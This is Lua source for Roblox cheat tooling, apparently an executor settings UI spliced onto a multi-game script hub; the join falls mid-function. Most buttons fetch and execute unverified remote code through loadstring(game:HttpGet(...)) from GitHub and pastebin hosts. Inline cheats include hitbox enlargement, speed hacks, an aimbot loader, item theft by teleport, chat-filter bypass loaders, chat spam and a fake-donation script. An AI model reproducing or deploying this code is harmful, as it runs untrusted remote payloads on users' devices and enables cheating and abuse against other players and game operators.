					BackgroundColor3 = Color3.fromHex("141414"), 
					Name = "flagContainer", 
					Size = UDim2.new(0, 40, 0, 30), 
					ZIndex = 2
				}, {
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("101010"), 
						Name = "stroke", 
						Thickness = 1.2
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "", 
						Name = "icon", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -8, 1, -6), 
						ZIndex = 2
					})
				}),
				create("TextLabel", { 
					AnchorPoint = Vector2.new(1, 0.5), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size11, 
					Name = "title", 
					Position = UDim2.new(1, 0, 0.5, 0), 
					Size = UDim2.new(1, -50, 1, 0), 
					Text = "", 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 11, 
					TextXAlignment = Enum.TextXAlignment.Left, 
					ZIndex = 2
				})
			});

			local languages = _settings.left.languages;
			local title = languages.title;

			local drop = languages.drop;
			local container = drop.container;

			container.list:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
				container.CanvasSize = UDim2.new(0, 0, 0, container.list.AbsoluteContentSize.Y + 2);			
			end);

			for i, v in next, sortedLanguageDatabase do
				local clone = template:Clone();
				clone.Name = v.key;
				clone.title.Text = v.value.indicator;
				clone.flagContainer.icon.Image = v.value.flag;

				clone.MouseButton1Click:Connect(function()
					title.Text = v.value.indicator;
					updateSettings("language", v.key);
				end);

				clone.Parent = container;
			end

			do
				local isOpen = false;

				local function toggleDrop()
					isOpen = not isOpen;
					drop.Visible = isOpen;
				end

				title.MouseButton1Click:Connect(toggleDrop);
				languages.indicator.MouseButton1Click:Connect(toggleDrop);
			end
		end

		do
			local template = create("TextButton", {
				AutoButtonColor = false, 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "apiExample", 
				Size = UDim2.new(1, 0, 0, 30), 
				Text = "", 
				ZIndex = 2
			}, {
				create("Frame", { 
					BackgroundColor3 = Color3.fromHex("141414"), 
					Name = "iconContainer", 
					Size = UDim2.new(0, 30, 0, 30), 
					ZIndex = 2
				}, {
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("101010"), 
						Name = "stroke", 
						Thickness = 1.2
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "", 
						Name = "icon", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -6, 1, -6), 
						ZIndex = 2
					})
				}),
				create("TextLabel", { 
					AnchorPoint = Vector2.new(1, 0.5), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size11, 
					Name = "title", 
					Position = UDim2.new(1, 0, 0.5, 0), 
					Size = UDim2.new(1, -40, 1, 0), 
					Text = "", 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 11, 
					TextXAlignment = Enum.TextXAlignment.Left, 
					ZIndex = 2
				})
			});

			local scriptApi = _settings.right.scriptApi;
			local title = scriptApi.title;

			local drop = scriptApi.drop;
			local container = drop.container;

			for i, v in next, validSearchFunctions do
				local clone = template:Clone();
				clone.Name = i;
				clone.title.Text = i;
				clone.iconContainer.icon.Image = v;

				clone.MouseButton1Click:Connect(function()
					title.Text = i;
					updateSettings("searchAPI", i);
				end);

				clone.Parent = container;
			end

			do
				local isOpen = false;

				local function toggleDrop()
					isOpen = not isOpen;
					drop.Visible = isOpen;
				end

				title.MouseButton1Click:Connect(toggleDrop);
				scriptApi.indicator.MouseButton1Click:Connect(toggleDrop);
			end
		end

		local function updateToggle(toggle, key, value)
			tween(toggle.indicator.icon, 0.18, {
				ImageTransparency = value and 0 or 1;
			});
			updateSettings(key, value);
		end

		do
			local unlockFps = _settings.left.unlockFps;

			local function run(state)
				_setfpscap(state and (uiSettings.vSync and _getfpsmax() or uiSettings.fps) or 60);
			end

			unlockFps.MouseButton1Click:Connect(function()
				local state = not uiSettings.unlockFps;
				updateToggle(unlockFps, "unlockFps", state);
				run(state);
			end);

			if uiSettings.unlockFps then
				run(true);
			end
		end

		do
			local vSync = _settings.left.vSync;

			local function run(state)
				if uiSettings.unlockFps then
					_setfpscap(state and _getfpsmax() or uiSettings.fps);
				end
			end

			vSync.MouseButton1Click:Connect(function()
				local state = not uiSettings.vSync;
				updateToggle(vSync, "vSync", state);
				run(state);
			end);

			if uiSettings.vSync then
				run(true);
			end
		end

		do
			local fpsValue = _settings.left.fpsValue;

			local container = fpsValue.container;
			local indicator = container.indicator;

			local function run(value)
				tween(indicator, 0.18, {
					Size = UDim2.new((value - 1) / 998, 0, 1, 0)
				});
				fpsValue.value.Text = tostring(value);
				if uiSettings.unlockFps then
					_setfpscap(value);
				end
			end

			container.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					local inputConn = userInputService.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
							local value = math.clamp(math.round(1 + (998 * (input.Position.X - container.AbsolutePosition.X) / container.AbsoluteSize.X)), 1, 999);
							uiSettings.fps = value;
							run(value);
						end
					end);
					local conn; conn = input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							inputConn:Disconnect();
							conn:Disconnect();
							updateSettings("fps", uiSettings.fps);
						end
					end);
				end
			end);

			if uiSettings.fps ~= 60 then
				run(uiSettings.fps);
			end
		end

		do
			local antiAfk = _settings.right.antiAfk;

			local function run(state)
				local conns = _getconnections(localPlayer.Idled);
				for i = 1, #conns do
					local v = conns[i];
					if state then
						v:Disable();
					else
						v:Enable();
					end
				end
			end

			antiAfk.MouseButton1Click:Connect(function()
				local state = not uiSettings.antiAfk;
				updateToggle(antiAfk, "antiAfk", state);
				run(state);
			end);

			if uiSettings.antiAfk then
				run(true);
			end
		end

		do
			local hopModeBtns = _settings.right.serverHopMode;
			local selectedBtn = hopModeBtns[uiSettings.serverHopMode];

			local function selectMode(btn)
				if selectedBtn ~= btn then
					tween(selectedBtn, 0.18, {
						BackgroundColor3 = Color3.fromHex("181818");
					});
					selectedBtn = btn;
					tween(btn, 0.18, {
						BackgroundColor3 = Color3.fromHex("303030");
					});
					updateSettings("serverHopMode", btn.Name);
				end
			end

			local buttonList = hopModeBtns:GetChildren();
			for i = 1, #buttonList do
				local v = buttonList[i];
				if v:IsA("TextButton") then
					v.MouseButton1Click:Connect(function()
						selectMode(v);
					end);
				end
			end
			
			task.defer(function()
				local data, count, total = {}, 0, 2;
				for i = 1, #buttonList do
					local v = buttonList[i];
					if v:IsA("TextButton") then
						count, total, data[v] = count + 1, total + v.TextBounds.X, v.TextBounds.X;
					end
				end
				local suffix = (hopModeBtns.AbsoluteSize.X - (total + 8 * (count - 1))) / count;
				for i, v in next, data do
					i.Size = UDim2.new(0, v + suffix, 0, 28);
				end
			end);
		end

		do
			local function teleport(jobId)
				teleportService:TeleportToPlaceInstance(game.PlaceId, jobId);
			end

			local function serverHop()
				local mode, jobId = uiSettings.serverHopMode, nil;
				if mode == "bestPing" or mode == "random" then
					local servers = {};
					local cursor, count = "", 0;
					repeat
						local res = jsonDecode(httpService, game:HttpGetAsync(string.format("https://games.roblox.com/v1/games/%d/servers/0?&excludeFullGames=true&cursor=%s", game.PlaceId, cursor), true));
						for i = 1, #res.data do
							local v = res.data[i];
							if v.id ~= game.JobId then
								servers[#servers + 1] = v;
							end
						end
						cursor = res.nextPageCursor;
						count = count + 1;
					until cursor == nil or count >= 25;
					if mode == "Ping" then
						table.sort(servers, function(a, b)
							return a.ping < b.ping;
						end);
						jobId = servers[1] and servers[1].id;
					else
						jobId = servers[1] and servers[math.random(1, #servers)].id;
					end
				else
					local res = jsonDecode(httpService, game:HttpGetAsync(string.format("https://games.roblox.com/v1/games/%d/servers/0?sortOrder=%d&excludeFullGames=true&limit=10", game.PlaceId, mode == "full" and 2 or 1), true));
					for i = 1, #res.data do
						local v = res.data[i];
						if v.id ~= game.JobId then
							jobId = v.id;
							break;
						end
					end
				end
				if jobId then
					teleport(jobId);
				end
			end

			_settings.right.serverHop.hop.MouseButton1Click:Connect(serverHop);
			_settings.right.serverHop.rejoin.MouseButton1Click:Connect(function()
				teleport(game.JobId);
			end);
		end

		task.defer(function()
			_settings.left.CanvasSize = UDim2.new(0, 0, 0, _settings.left.list.AbsoluteContentSize.Y + 2);
			_settings.right.CanvasSize = UDim2.new(0, 0, 0, _settings.right.list.AbsoluteContentSize.Y + 2);
		end);
	end

	changeLanguage(uiSettings.language);
	rconsoleprint("Evon-Android Successfully Loaded!");
end;

--[[ Load ]]--

loadKeyUI(loadMainUI);
end
      		print("button pressed")
  	end    
})

local Tab5 = Window:MakeTab({
	Name = "Pet Sim X",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab5:AddButton({
	Name = "Zap Hub",
	Callback = function()
	  getgenv().FV = true
loadstring(game:HttpGet('https://raw.githubusercontent.com/ZapHub-Script/ZapHub/main/Exec'))()
      		print("button pressed")
  	end    
})

Tab5:AddButton({
	Name = "Admin Panel (By GearV4)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterX768/AdminPanel/main/AdminPanel.lua"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab5:AddButton({
	Name = "auto orb",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet"https://raw.githubusercontent.com/Krnow1/Ganjahub/main/Ganjahubontop")()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab5:AddButton({
	Name = "Ganja hub",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet"https://raw.githubusercontent.com/Krnow1/Ganjahub/main/Ganjahubontop")()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab6 = Window:MakeTab({
	Name = "Murder Vs Sheriff",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab6:AddButton({
	Name = "EmptynessProject",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TheEmptynessProject/EmptynessProject/main/index.lua"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab6:AddButton({
	Name = "Murder Vs Sheriff by GearV4",
	Callback = function()
	  local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Murderes vs sherifs duel", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

OrionLib:MakeNotification({
	Name = "Hey crdits to",
	Content = "GearV4 + join Exploit X",
	Image = "rbxassetid://4483345998",
	Time = 8
})

local Tab = Window:MakeTab({
	Name = "Main Tab",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "Esp",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/N7UcS9f4"))();
         print("button pressed")
  	end    
})
Tab:AddButton({
	Name = "Hitbox",
	Callback = function()
      	_G.HeadSize = 20
_G.Disabled = true

game:GetService('RunService').RenderStepped:Connect(function()
    if _G.Disabled then
        for _, player in ipairs(game:GetService('Players'):GetPlayers()) do
            if player.Name ~= game:GetService('Players').LocalPlayer.Name then
                pcall(function()
                    local character = player.Character
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        humanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                        humanoidRootPart.Transparency = 0.7
                        humanoidRootPart.BrickColor = BrickColor.new("Bright red") -- Changed color to red
                        humanoidRootPart.Material = Enum.Material.Neon -- Changed material to Neon
                        humanoidRootPart.CanCollide = false
                    end
                end)
            end
        end
    end
end)

    	print("button pressed")
  	end    
})
Tab:AddButton({
	Name = "Speed gui",
	Callback = function()

local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(1, 1, 1)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local speedButton = Instance.new("TextButton")
speedButton.Size = UDim2.new(0, 100, 0, 50)
speedButton.Position = UDim2.new(0.5, -50, 0.5, -25)
speedButton.BackgroundColor3 = Color3.new(0, 0.5, 1)
speedButton.Text = "Speed"
speedButton.Parent = frame

local function unleashYourPower()
    local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = humanoid.WalkSpeed + 100
    end
end

speedButton.MouseButton1Click:Connect(unleashYourPower)
       	print("button pressed")
  	end    
})
Tab:AddButton({
	Name = "inf yile",
	Callback = function()
      	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
     	print("button pressed")
  	end    
})
local Section = Tab:AddSection({
	Name = "made by: GearV4"
})

 OrionLib:Init()
      		print("button pressed")
  	end    
})

local Tab7 = Window:MakeTab({
	Name = "FE And GUI",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab7:AddButton({
	Name = "Nova X Animation",
	Callback = function()
	  loadstring(game:HttpGet('https://pastebin.com/raw/q2V1KPEc'))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab7:AddButton({
	Name = "Animation FE",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/FE-Animation/main/Fe%20Animation"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab7:AddButton({
	Name = "Hat Orbit FE",
	Callback = function()
	  loadstring(game:HttpGet('https://pastebin.com/raw/BsJ4xfXu'))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab7:AddButton({
	Name = "Yeet Gui",
	Callback = function()
	  loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab8 = Window:MakeTab({
	Name = "Discord",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab8:AddButton({
	Name = "Discord Link Join Now",
	Callback = function()
	  local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Utils/Discord%20Inviter/DiscordInviter.lua"))()
discord:invite("discord.gg/bypassers", "Error | Bypasser", function()
    print("Loaded!")
end)
      		print("button pressed")
  	end    
})

Tab8:AddButton({
	Name = "Script Made By GearV4",
	Callback = function()
      		print("button pressed")
  	end    
})

local Tab9 = Window:MakeTab({
	Name = "Project Smash",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab9:AddButton({
	Name = "Tora Project Smash",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/ProjectSmash'))()
      		print("button pressed")
  	end    
})

Tab9:AddButton({
	Name = "LoLKing Project Smash",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Smash/main/Project"))()
      		print("button pressed")
  	end    
})

local Tab10 = Window:MakeTab({
	Name = "TSB Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab10:AddButton({
	Name = "Tsb Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/SaitamaBattlegrounds.lua"))()
      		print("button pressed")
  	end    
})

Tab10:AddButton({
	Name = "CheatHub TSB Version",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/BadWare/Hub/Load.lua", true))()
      		print("button pressed")
  	end    
})

Tab10:AddButton({
	Name = "NexHub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
--key: TkMVuUdCS29mdpi6KvF31yNHLHfSGUV5
      		print("button pressed")
  	end    
})

local Tab12 = Window:MakeTab({
	Name = "BLOX FRUIT",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab12:AddButton({
	Name = "Makori Hub",
	Callback = function()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/NewHubX.txt"))()
      		print("button pressed")
  	end    
})

Tab12:AddButton({
	Name = "MTRIET HUB",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/MTriet-Hub.lua"))()
      		print("button pressed")
  	end    
})

Tab12:AddButton({
	Name = "Hoho Hub",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/ascn123/HOHO_H/main/Loading_UI'))()
      		print("button pressed")
  	end    
})

Tab12:AddButton({
	Name = "GanTeng Hub V1",
	Callback = function()
	  loadstring(game:HttpGet("https://isnahamzahpastebin.tech/v1/gantenghubv1_026"))()
      		print("button pressed")
  	end    
})

Tab12:AddButton({
	Name = "Vector Hub",
	Callback = function()
	  _G.Mode = "English"
loadstring(game:HttpGet("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/MBPC"))()
      		print("button pressed")
  	end    
})

local Tab13 = Window:MakeTab({
	Name = "WestBound",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab13:AddButton({
	Name = "WestBound V1",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/NooVster/NOOVHUB/main/Source"))()
      		print("button pressed")
  	end    
})

Tab13:AddButton({
	Name = "WestBound Hub V2",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/westyourballz"))()
      		print("button pressed")
  	end    
})

Tab13:AddButton({
	Name = "WestBound V3",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/westbound.pro-Utilites/main/Main.lua"))()
      		print("button pressed")
  	end    
})

local Tab14 = Window:MakeTab({
	Name = "Survive The Killers",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab14:AddButton({
	Name = "Survive the Killer V1",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51", true))()
      		print("button pressed")
  	end    
})

Tab14:AddButton({
	Name = "Survive The Killer V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
      		print("button pressed")
  	end    
})

local Tab15 = Window:MakeTab({
	Name = "Arsenal",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab15:AddButton({
	Name = "Arsenal V1",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Arsenalscript.txt"))()
      		print("button pressed")
  	end    
})

Tab15:AddButton({
	Name = "Arsenal V2",
	Callback = function()
	  loadstring(game:HttpGet(("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"), true))()
      		print("button pressed")
  	end    
})

Tab15:AddButton({
	Name = "Aimbot",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Aimbot.lua/main/Aimbot"))();
      		print("button pressed")
  	end    
})

local Tab16 = Window:MakeTab({
	Name = "Piggy",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab16:AddButton({
	Name = "Piggy V1",
	Callback = function()
	  loadstring(game:HttpGet(('https://raw.githubusercontent.com/lolpoppyus/Roblox-Lua/master/Piggy'),true))()
      		print("button pressed")
  	end    
})

Tab16:AddButton({
	Name = "Get All Items",
	Callback = function()
	  --[[Credits to GearV4 :)]]--
 
local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.StarterGui
 
local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
 
 
 
 
local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.CoreGui
 
local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
 
local UIGridLayout = Instance.new("UIGridLayout", ScrollingFrame)
UIGridLayout.CellSize = UDim2.new(0,90,0,90)
 
while wait(1) do
local a = workspace:getDescendants()
local items = {}
local itemframes = ScrollingFrame:getChildren()
for i=1,#itemframes do
if itemframes[i].ClassName == "TextButton" then
itemframes[i]:remove()
end
end
for i=1,#a do
if a[i].Name == "ItemPickupScript" and a[i].Parent:findFirstChild("ClickDetector") then
table.insert(items, a[i].Parent)
end
end
for i=1,#items do
local ItemFrame = Instance.new("TextButton", ScrollingFrame)
ItemFrame.Name = "ItemFrame"
ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ItemFrame.BackgroundTransparency = 0.95
ItemFrame.Size = UDim2.new(0, 100, 0, 100)
ItemFrame.Text = ""
local View = Instance.new("ViewportFrame", ItemFrame)
View.Name = "View"
View.Size = UDim2.new(1,0,1,0)
View.BackgroundTransparency = 1
View.BorderSizePixel = 0
local object = items[i]
local viewportclone = object:Clone()
viewportclone.Parent = View
local cam = Instance.new("Camera", viewportclone)
cam.CameraType = Enum.CameraType.Fixed
local objectPosition = object.Position
local cameraPosition = objectPosition + Vector3.new(0,3,0)
cam.CoordinateFrame = CFrame.new(cameraPosition, objectPosition)
View.CurrentCamera = cam
 
ItemFrame.MouseButton1Down:connect(function()
if items[i]:findFirstChild("ClickDetector") then
local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait(0.05)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = items[i].CFrame
wait(0.1)
fireclickdetector(items[i].ClickDetector)
wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end
end)
end
end
      		print("button pressed")
  	end    
})

local Tab17 = Window:MakeTab({
	Name = "Legends of Speed",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab17:AddButton({
	Name = "Legends Hub By GearV4",
	Callback = function()
	  -- Script Here
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Legends-Hub-V2/main/Legends%20Hub%20V2"))();
      		print("button pressed")
  	end    
})

Tab17:AddButton({
	Name = "Uchina Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/fareljr1/Hub/main/Loader"))()
	  -- Script Here
      		print("button pressed")
  	end    
})

local Tab18 = Window:MakeTab({
	Name = "FNF",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab18:AddButton({
	Name = "FNF V1",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/RandomScript/main/FunkyFridayMobile"))()
	  -- Script Here
      		print("button pressed")
  	end    
})

Tab18:AddButton({
	Name = "Script Hub V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV2/main/SCRIPTHUBV2", true))()
	  -- Script Here
      		print("button pressed")
  	end    
})

local Tab19 = Window:MakeTab({
	Name = "BrookHaven",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab19:AddButton({
	Name = "Ice Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
	  -- Script Here
      		print("button pressed")
  	end    
})

Tab19:AddButton({
	Name = "Meta Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/NocturneMoDz/BROOKHAVEN-GUI-/main/METAB", true))()
	  -- Script Here
      		print("button pressed")
  	end    
})

local Tab20 = Window:MakeTab({
	Name = "CHAT BYPASS",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab20:AddButton({
	Name = "Chat Bypass V1",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/katrina367/ScriptBlox-Projects/main/Chat%20Bypasser'))()
	  -- Script Here
      		print("button pressed")
  	end    
})

Tab20:AddButton({
	Name = "Chat Bypass V2",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/RealRBC/RBC.Byp/main/RBC.Byp%20V.1.3"))()
	  -- Script Here
      		print("button pressed")
  	end    
})

Tab20:AddButton({
	Name = "Spam Exploit X On Top",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- Function to spam the message in the chat
local function spamChat()
    while true do
        wait(5) -- Adjust the time interval between each message (in seconds)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EXPLOIT X ON TOP", "All")
    end
end

-- Execute the spamChat function when the script is activated
spamChat()
	  -- Script Here
      		print("button pressed")
  	end    
})

local Tab21 = Window:MakeTab({
	Name = "Pls donate",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab21:AddButton({
	Name = "Pls Donate V1",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/tzechco"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab21:AddButton({
	Name = "Pls Donate V2",
	Callback = function()
	  loadstring(game:HttpGet(("https://raw.githubusercontent.com/o5u3/PLS-Donate/main/Fake-Donate.lua")))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab22 = Window:MakeTab({
	Name = "Random Script",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab22:AddButton({
	Name = "Cyan hub",
	Callback = function()
	  local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("Cyans executor", "Midnight")

-- Tabs
local Tab1 = Window:NewTab("Good scripts")
local Tab2 = Window:NewTab("Other Scripts")
local Tab3 = Window:NewTab("Visuals/Settings")
local Tab4 = Window:NewTab("•Credits•")


-- Sections inside tabs
local Tab1Section = Tab1:NewSection("2.2 Update:")
local Tab1Section = Tab1:NewSection("- Added Few Update Logs Here")
local Tab1Section = Tab1:NewSection("- Added More Fun Scripts")
local Tab1Section = Tab1:NewSection("- Added RTX")
local Tab1Section = Tab1:NewSection("Fast Hacks")
local Tab2Section = Tab2:NewSection("--The Flings And Hubs And More.")
local Tab3Section = Tab3:NewSection("Visuals!")
local Tab4Section = Tab4:NewSection("Script made by GearV4.")


-- Buttons
Tab1Section:NewButton("Infinite Yield", "Yields Of Fields", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

Tab1Section:NewButton("Prevail X", "Script", function()
loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
end)

Tab1Section:NewToggle("Tiger Admin", "Finally Something good", function(state)
    if state then
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
    end
end)

Tab1Section:NewButton("Sounds", "Annoying sounds for prison life", function()
getgenv().DisableWebhook = false
while wait() do
for i,v in pairs(game.Players:GetChildren()) do
pcall(function()
